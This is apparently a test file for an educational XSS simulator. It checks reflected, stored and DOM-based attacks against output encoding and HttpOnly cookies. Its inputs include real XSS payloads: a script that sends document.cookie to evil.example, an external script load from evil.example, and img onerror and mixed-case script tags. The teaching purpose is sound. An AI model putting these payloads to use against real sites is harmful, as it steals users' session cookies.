import { describe, expect, it } from 'vitest';
import type { GridView, PanelsView, Step } from '../../types/visualization';
import { crossSiteScriptingSteps, DEFENSE_OPTIONS, WHERE_OPTIONS } from './cross-site-scripting';

const [REFLECTED, STORED, DOM] = WHERE_OPTIONS;
const [OFF, ON, HTTP_ONLY] = DEFENSE_OPTIONS;

const STEAL = "<script>fetch('https://evil.example/c?' + document.cookie)</script>";
const IMAGE = '<img src=x onerror=alert(1)>';

const run = (where: string, input: string, defense: string) => crossSiteScriptingSteps({ where, input, defense });
const last = (steps: Step[]) => steps.at(-1)!;
const result = (where: string, input: string, defense: string) => last(run(where, input, defense)).variables!.result;
const words = (steps: Step[]) => steps.map((step) => `${step.title} ${step.why}`).join(' ');
const page = (steps: Step[]) => {
  const panel = steps.flatMap((step) => (step.view as PanelsView).panels).find((p) => p.label === 'Page')!;
  return (panel.view as GridView).rows[0]!.cells[0]!.value;
};

describe('cross-site scripting', () => {
  it.each([REFLECTED!, STORED!])('%s steals the cookie with encoding off', (where) => {
    const steps = run(where, STEAL, OFF!);
    expect(last(steps).variables!.result).toBe('attacker in');
    expect(last(steps).variables!.stolen).toMatch(/^sid=[0-9a-f]{32}$/);
  });

  it.each([REFLECTED!, STORED!, DOM!])('%s stops with encoding on, and the payload shows as text', (where) => {
    for (const input of [STEAL, IMAGE]) {
      const steps = run(where, input, ON!);
      expect(last(steps).variables!.result).toBe('stopped');
      expect(last(steps).variables!.stolen).toBe('nothing');
    }
    expect(page(run(REFLECTED!, STEAL, ON!))).toContain('&lt;script&gt;');
  });

  it('leaves <script> inert in the DOM case, and says so', () => {
    const steps = run(DOM!, STEAL, OFF!);
    expect(last(steps).variables!.result).toBe('stopped');
    expect(words(steps)).toContain('innerHTML');
  });

  it('runs an image handler in the DOM case', () => {
    const steps = run(DOM!, IMAGE, OFF!);
    expect(last(steps).variables!.result).toBe('attacker in');
    expect(words(steps)).toContain('alert("1")');
  });

  it('never sends the fragment to the server', () => {
    const steps = run(DOM!, IMAGE, OFF!);
    expect(words(steps)).toContain('never sent');
  });

  it('gives empty text from an HttpOnly cookie, and says so, while the script still runs', () => {
    const steps = run(REFLECTED!, STEAL, HTTP_ONLY!);
    expect(last(steps).variables!.result).toBe('attacker in');
    expect(last(steps).variables!.stolen).toBe('empty text');
    expect(words(steps)).toContain('HttpOnly');
    expect(words(steps)).toContain('still ran');
  });

  it('runs a script from another site', () => {
    expect(last(run(REFLECTED!, '<script src=https://evil.example/x.js></script>', OFF!)).variables!.stolen).toMatch(/^sid=/);
  });

  it('reports nothing stolen when a script sends something else out', () => {
    expect(last(run(REFLECTED!, "<script>fetch('https://evil.example/c?x=1')</script>", OFF!)).variables!.stolen).toBe('nothing');
  });

  it('says a script outside the language is not understood, and is not a win', () => {
    const steps = run(REFLECTED!, '<script>eval(1)</script>', OFF!);
    expect(last(steps).variables!.result).toBe('stopped');
    expect(words(steps)).toContain('does not understand');
  });

  it('says a click handler waits, and does not count it', () => {
    const steps = run(REFLECTED!, '<a onclick=alert(1)>go</a>', OFF!);
    expect(last(steps).variables!.result).toBe('stopped');
    expect(words(steps)).toContain('click');
  });

  it('runs nothing from unfinished markup', () => {
    expect(result(REFLECTED!, '<script>alert(1)', OFF!)).toBe('stopped');
    expect(result(REFLECTED!, '<img src=x onerror=alert(1)', OFF!)).toBe('stopped');
  });

  it('runs mixed case', () => {
    expect(result(REFLECTED!, '<ScRiPt>alert(1)</sCrIpT>', OFF!)).toBe('attacker in');
  });

  it.each(WHERE_OPTIONS.flatMap((where) => DEFENSE_OPTIONS.map((defense) => [where, defense] as const)))('treats hello as ordinary text in %s with %s', (where, defense) => {
    const steps = run(where, 'hello', defense);
    expect(last(steps).variables!.result).toBe('stopped');
    expect(words(steps)).not.toMatch(/attack|payload|steal|inject/i);
  });

  it('shows a stored comment coming from mallory', () => {
    expect(words(run(STORED!, IMAGE, OFF!))).toContain('mallory');
  });

  it('refuses bad knobs with one step', () => {
    expect(run('nope', 'x', OFF!)).toHaveLength(1);
    expect(run(REFLECTED!, 'x', 'nope')).toHaveLength(1);
    expect(run(REFLECTED!, '', OFF!)).toHaveLength(1);
  });
});
